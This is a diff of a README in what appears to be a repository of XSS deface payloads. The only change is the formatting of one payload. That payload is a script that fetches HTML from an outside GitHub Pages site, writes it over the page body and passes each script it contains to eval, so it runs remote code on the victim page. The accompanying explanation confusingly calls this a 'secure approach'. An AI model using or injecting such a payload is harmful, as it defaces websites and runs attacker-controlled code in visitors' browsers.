@@ -8,10 +8,13 @@ This repository contains various XSS (Cross-Site Scripting) deface payloads that
 ### Using with Fetch API
 
 ```html
-<script> fetch('https://karthikdude.github.io/Deface/')
-.then(response => response.text()) .then(html =>
-{ document.body.innerHTML = html; const scripts = document.body.getElementsByTagName('script');
-for (let script of scripts) { eval(script.innerText); } }); </script>
+<script>
+ fetch('https://karthikdude.github.io/Deface/')
+  .then(response => response.text()) .then(html =>
+ { document.body.innerHTML = html;
+ const scripts = document.body.getElementsByTagName('script');
+  for (let script of scripts) { eval(script.innerText); } });
+</script>
 ```
 
 **Details:** This payload fetches an external JavaScript file While this is a  secure approach, it is effective in environments where execution of external scripts is needed.
